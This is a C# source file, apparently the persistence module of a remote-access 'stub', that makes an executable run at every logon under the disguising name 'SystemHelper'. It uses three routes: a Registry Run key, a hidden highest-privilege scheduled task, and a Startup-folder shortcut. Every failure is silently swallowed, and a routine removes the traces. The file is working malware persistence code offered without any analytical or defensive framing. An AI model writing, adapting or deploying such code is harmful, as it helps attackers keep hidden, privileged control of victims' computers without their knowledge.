using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;

namespace RemoteStub
{
    /// <summary>
    /// Advanced persistence mechanisms
    /// </summary>
    public static class PersistenceManager
    {
        private const string APP_NAME = "SystemHelper";
        private const string TASK_NAME = "SystemHelperTask";

        /// <summary>
        /// Setup persistence using multiple methods
        /// </summary>
        public static void SetupPersistence(Config config)
        {
            try
            {
                var exePath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(exePath))
                    return;

                // Method 1: Registry Run key
                if (config.Persistence.Registry)
                {
                    SetupRegistryPersistence(exePath);
                }

                // Method 2: Task Scheduler (requires admin)
                if (config.Persistence.TaskScheduler && IsAdministrator())
                {
                    SetupTaskSchedulerPersistence(exePath);
                }

                // Method 3: Startup folder
                if (config.Persistence.StartupFolder)
                {
                    SetupStartupFolderPersistence(exePath);
                }
            }
            catch
            {
                // Silent fail
            }
        }

        /// <summary>
        /// Registry Run key persistence
        /// </summary>
        private static void SetupRegistryPersistence(string exePath)
        {
            try
            {
                // Try HKCU first (doesn't require admin)
                using var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key?.SetValue(APP_NAME, $"\"{exePath}\"");
            }
            catch
            {
                // Try HKLM if HKCU fails and we have admin rights
                if (IsAdministrator())
                {
                    try
                    {
                        using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                        key?.SetValue(APP_NAME, $"\"{exePath}\"");
                    }
                    catch { }
                }
            }
        }

        /// <summary>
        /// Task Scheduler persistence (requires admin)
        /// </summary>
        private static void SetupTaskSchedulerPersistence(string exePath)
        {
            try
            {
                using var ts = new TaskService();
                
                // Delete existing task if any
                ts.RootFolder.DeleteTask(TASK_NAME, false);

                // Create new task
                var td = ts.NewTask();
                td.RegistrationInfo.Description = "System Helper Service";
                td.Principal.RunLevel = TaskRunLevel.Highest;
                
                // Trigger: At logon
                td.Triggers.Add(new LogonTrigger());
                
                // Trigger: Daily at startup
                var dailyTrigger = new DailyTrigger
                {
                    StartBoundary = DateTime.Now,
                    DaysInterval = 1
                };
                td.Triggers.Add(dailyTrigger);

                // Action: Run executable
                td.Actions.Add(new ExecAction(exePath));

                // Settings
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Settings.StopIfGoingOnBatteries = false;
                td.Settings.ExecutionTimeLimit = TimeSpan.Zero;
                td.Settings.Hidden = true;
                td.Settings.Priority = ProcessPriorityClass.Normal;

                // Register task
                ts.RootFolder.RegisterTaskDefinition(TASK_NAME, td);
            }
            catch
            {
                // Silent fail if Task Scheduler is not available
            }
        }

        /// <summary>
        /// Startup folder persistence
        /// </summary>
        private static void SetupStartupFolderPersistence(string exePath)
        {
            try
            {
                var startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                var linkPath = Path.Combine(startupPath, $"{APP_NAME}.lnk");

                // Create shortcut
                CreateShortcut(exePath, linkPath);
            }
            catch { }
        }

        /// <summary>
        /// Create Windows shortcut
        /// </summary>
        private static void CreateShortcut(string targetPath, string shortcutPath)
        {
            try
            {
                Type shellType = Type.GetTypeFromProgID("WScript.Shell");
                dynamic shell = Activator.CreateInstance(shellType);
                var shortcut = shell.CreateShortcut(shortcutPath);
                
                shortcut.TargetPath = targetPath;
                shortcut.WorkingDirectory = Path.GetDirectoryName(targetPath);
                shortcut.Description = "System Helper";
                shortcut.Save();

                System.Runtime.InteropServices.Marshal.ReleaseComObject(shortcut);
                System.Runtime.InteropServices.Marshal.ReleaseComObject(shell);
            }
            catch { }
        }

        /// <summary>
        /// Check if running with administrator privileges
        /// </summary>
        private static bool IsAdministrator()
        {
            try
            {
                using var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Remove all persistence mechanisms
        /// </summary>
        public static void RemovePersistence()
        {
            try
            {
                // Remove registry entries
                try
                {
                    using var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    key?.DeleteValue(APP_NAME, false);
                }
                catch { }

                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    key?.DeleteValue(APP_NAME, false);
                }
                catch { }

                // Remove task scheduler task
                try
                {
                    using var ts = new TaskService();
                    ts.RootFolder.DeleteTask(TASK_NAME, false);
                }
                catch { }

                // Remove startup folder shortcut
                try
                {
                    var startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    var linkPath = Path.Combine(startupPath, $"{APP_NAME}.lnk");
                    if (File.Exists(linkPath))
                        File.Delete(linkPath);
                }
                catch { }
            }
            catch { }
        }
    }
}
